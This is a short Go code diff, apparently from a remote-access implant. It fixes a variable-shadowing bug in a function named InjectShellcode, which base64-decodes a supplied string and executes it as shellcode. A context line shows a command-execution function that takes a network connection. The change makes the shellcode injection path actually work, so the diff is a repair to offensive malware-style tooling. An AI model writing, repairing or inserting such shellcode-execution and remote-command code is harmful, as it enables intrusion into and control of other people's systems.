@@ -21,7 +21,7 @@ func ExecuteCmd(command string, conn net.Conn) {
 
 func InjectShellcode(encShellcode string) {
 	if encShellcode != "" {
-		if encShellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
+		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
 			ExecShellcode(shellcode)
 		}
 	}
